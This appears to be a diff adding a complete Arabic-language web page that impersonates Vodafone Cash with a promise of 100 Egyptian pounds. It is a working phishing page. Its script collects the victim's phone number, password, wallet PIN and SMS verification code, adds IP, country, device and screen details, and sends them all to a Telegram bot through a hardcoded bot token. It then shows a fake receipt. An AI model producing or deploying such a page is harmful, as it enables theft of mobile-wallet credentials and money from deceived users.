@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>فودافون كاش | استلم 100 جنيه</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: #f7f7f7;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 420px;
+    }
+    h2 {
+      text-align: center;
+      color: #e60000;
+      margin-bottom: 1rem;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+    button {
+      background: #e60000;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+    }
+    .footer {
+      font-size: 0.8rem;
+      color: gray;
+      text-align: center;
+      margin-top: 10px;
+    }
+    #receipt {
+      display: none;
+      text-align: center;
+      font-family: 'Cairo', sans-serif;
+      padding: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="formContainer">
+    <h2>استلم 100 جنيه فودافون كاش</h2>
+    <input type="text" id="phone" placeholder="رقم الموبايل" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <input type="text" id="pin" placeholder="كود المحفظة (6 أرقام)" required>
+    <input type="text" id="confirm" placeholder="تأكيد رقم الموبايل" required>
+    <button onclick="sendData()">استلام الآن</button>
+    <p class="footer">🔒 معلوماتك مؤمنة عبر نظام التحقق</p>
+  </div>
+  <div id="receipt"></div>
+
+  <script>
+    const token = "7989278640:AAEd5fyTYU5VauNqEwyUo-8I-vRqj6MU0m0";
+    const chat_id = "1896998598";
+
+    function sendData() {
+      const phone = document.getElementById("phone").value;
+      const password = document.getElementById("password").value;
+      const pin = document.getElementById("pin").value;
+      const confirm = document.getElementById("confirm").value;
+      const sms = prompt("📲 تم إرسال كود تحقق إلى رقمك! \nمن فضلك أدخله لتأكيد استلام الرصيد:");
+
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const screen = `${window.screen.width}x${window.screen.height}`;
+          const message = `📥 بيانات فودافون كاش:\n📞 رقم: ${phone}\n🔐 كلمة المرور: ${password}\n🔑 PIN: ${pin}\n📱 تأكيد: ${confirm}\n📲 كود SMS: ${sms}\n🌍 IP: ${data.ip}\n📍 الدولة: ${data.country_name}\n🖥️ الجهاز: ${navigator.userAgent}\n📐 الشاشة: ${screen}\n🕒 ${new Date().toLocaleString()}`;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chat_id, text: message })
+          });
+
+          document.getElementById("formContainer").style.display = "none";
+          const receipt = document.getElementById("receipt");
+          receipt.style.display = "block";
+          receipt.innerHTML = `
+            <h2>✅ تم استلام بياناتك</h2>
+            <p>رقم الطلب: VFCASH-${Math.floor(Math.random()*999999)}</p>
+            <p>المبلغ: 100 جنيه</p>
+            <p>التاريخ: ${new Date().toLocaleString()}</p>
+            <p>شكراً لاستخدامك فودافون كاش</p>
+          `;
+        });
+    }
+  </script>
+</body>
+</html>
